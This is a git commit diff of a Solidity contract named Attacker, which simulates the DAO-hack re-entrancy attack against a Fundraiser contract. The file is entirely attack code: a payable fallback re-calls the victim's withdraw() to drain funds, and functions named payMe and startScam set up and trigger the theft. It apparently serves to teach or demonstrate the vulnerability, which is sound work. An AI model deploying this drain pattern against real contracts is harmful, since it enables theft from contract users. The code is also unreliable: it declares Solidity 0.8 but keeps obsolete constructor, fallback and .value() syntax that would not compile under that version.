3928dce0666cf7227702a0437f6aad207f5277a6
TobyKreiselmaier <the.rainmaker@mail.com>
2020-12-22 10:20:39 -0500

    Commented and cleaned up code

--- Attacker.sol
+++ Attacker.sol
@@ -1,32 +1,49 @@
-pragma solidity ^0.4.8;
+/// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.8.0;
 
 import "./Fundraiser.sol";
 
+/// @title DAO Hack Attacker contract - simulates re-entrancy attack.
+
 contract Attacker{
     
+    /* views */
     address public fundraiserAddress;
     uint public drainTimes = 0;
     
-    function Attacker(address victimAddress){
+    /* Public functions */
+    /// @dev Captures address of the victim contract.
+    /// @param victimAddress address of victim contract on blockchain.
+    function Attacker(address victimAddress) public 
+    {
         fundraiserAddress = victimAddress;
     }
- 
-    function public () payable{
+
+    /// @dev Fallback function draining the victim contract.
+    function() external payable
+    {
         if(drainTimes<3){
             drainTimes++;
             Fundraiser(fundraiserAddress).withdraw();
         }
     }
     
-    function getFunds() returns (uint){
+    /// @dev Getter function for balance of attacker contract.
+    function getFunds() public returns (uint)
+    {
         return address(this).balance;
     }
-    
-    function payMe() payable{
+
+    /// @dev Calling the victim's contract contribute() method for funding.
+    function payMe() public payable
+    {
         Fundraiser(fundraiserAddress).contribute.value(msg.value)();
     }
-    
-    function startScam(){
+
+    /// @dev Calling the victim's contract withdraw() method to start the scam.
+    function startScam() public
+    {
         Fundraiser(fundraiserAddress).withdraw();
     }
 }
